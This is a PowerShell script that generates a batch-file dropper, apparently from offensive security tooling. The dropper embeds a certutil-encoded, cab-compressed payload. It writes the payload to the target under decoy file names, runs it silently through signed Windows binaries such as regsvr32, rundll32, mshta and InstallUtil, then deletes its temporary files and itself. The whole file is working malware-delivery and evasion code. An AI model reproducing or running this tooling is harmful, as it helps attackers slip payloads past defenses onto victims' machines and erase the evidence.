function Invoke-EmbedInBatch
{
    <#
	.AUTHOR
	@Arno0x0x - Based on @xorrior work (New-RegSvr32BatchFile)
	
    .SYNOPSIS
    Generates a batch file embedding a certutil encoded, cab compressed payload. Payload can be any type
	The payload is then executed using a command line specified as an argument, since the way of invoking the payload can vary depending on the payload itself (DLL, script, etc.)

    .DESCRIPTION
    The resulting batch file will decode and decompress the cab file, then execute the payload given the specified command line

    .PARAMETER PayloadPath
    File path to the payload.
	
	.PARAMETER FinalCommandLine
    Command line to execute once the payload has been dropped on the traget system.
	It MUST contain a placeholder name "_payload_" that will be replaced by the actual payload location

    .PARAMETER BatchFilePath
    Path to output the resulting bat file.

    .PARAMETER TargetDropPath
    The path, on the target, where to drop the resulting payload.

    .EXAMPLE
    Invoke-EmbedInBatch -PayloadPath installUtil.dll -FinalCommandLine "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U _payload_"
	Invoke-EmbedInBatch -PayloadPath regsvr32.sct -FinalCommandLine "regsvr32.exe /s /u /i:_payload_ scrobj.dll"
	Invoke-EmbedInBatch -PayloadPath standard.dll -FinalCommandLine "rundll32.exe _payload_,entrypoint"
	Invoke-EmbedInBatch -PayloadPath payload.hta -FinalCommandLine "mshta.exe _payload_"
	Invoke-EmbedInBatch -PayloadPath payload.exe -FinalCommandLine "_payload_"
    
    #>
    [CmdletBinding()]
    param
    (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [string]$PayloadPath,
		
		[Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [string]$FinalCommandLine,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]$BatchFilePath = "malicious.bat",

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]$TargetDropPath = "%APPDATA%"
    )

	#----------------------------------------------------------------------------------------
	# Perform arguments checking
	if (!(Test-Path $PayloadPath)) {
		Write-Host "[ERROR] File [$PayloadPath] not found"
		return -1 | Out-Null
	}
	
	if (!($FinalCommandLine -Match "_payload_")) {
		Write-Host "[ERROR] The FinalCommandLine argument should contain a '_payload_' placeholder. Check the EXAMPLE section."
		return -1 | Out-Null
	}
	
	#----------------------------------------------------------------------------------------
	# Retrieve the payload file name out of the payload path
	$PayloadFileName = Split-Path $PayloadPath -leaf
	
	$FinalCommandLine = $FinalCommandLine.Replace("_payload_", $TargetDropPath + "\" + $PayloadFileName)
	
	#----------------------------------------------------------------------------------------
	# Create the compressed and base64 encoded version of the payload
	$res = makecab $PayloadPath payload.cab
	if ($res -eq $null) {
		Write-Host "[ERROR] Failure executing [makecab $Payload payload.cab]"
		return
	}
	
	$res = certutil -encode payload.cab payload.txt
	if ($res -eq $null) {
		Write-Host "[ERROR] Failure executing [certutil -encode payload.cab payload.txt]"
		return
	}
	
	#----------------------------------------------------------------------------------------
	# So far so good, let's create the final batch file embedding the payload.txt version of the payload
	
	$TemplateBatch = @"
@echo off
SET outFile=`"$TargetDropPath\$PayloadFileName`"
SET dropPath="%TEMP%"
SET dropTXT="%dropPath%\debug.txt"
SET dropCAB="%dropPath%\debug.cab"
(
    ECHOCMDLINES
) > %dropTXT%
certutil -decode "%dropTXT%" "%dropCAB%" > NUL
expand %dropCAB% "%outFile%" > NUL
start /b $FinalCommandLine
timeout /t 5 /nobreak > NUL
del "%dropTXT%"
del "%dropCAB%"
del "%outFile%"
start /b "" cmd /c del "%~f0"&exit /b
"@

    $certUtilEncodedBinary = Get-Content -Encoding Ascii payload.txt
    $echolines = $certUtilEncodedBinary | % {"echo $_";$count+=1}

    $TemplateBatch = $TemplateBatch.Replace("ECHOCMDLINES",$echolines -join "`n`t")
    $TemplateBatch = $TemplateBatch -creplace '(?m)^\s*\r?\n',''

    $TemplateBatch | Out-File -Encoding ascii $BatchFilePath -Force

    Get-ChildItem -Path $BatchFilePath
	
	#----------------------------------------------------------------------------------------
	# Cleanup temporary files
	Remove-Item payload.cab
	Remove-Item payload.txt
}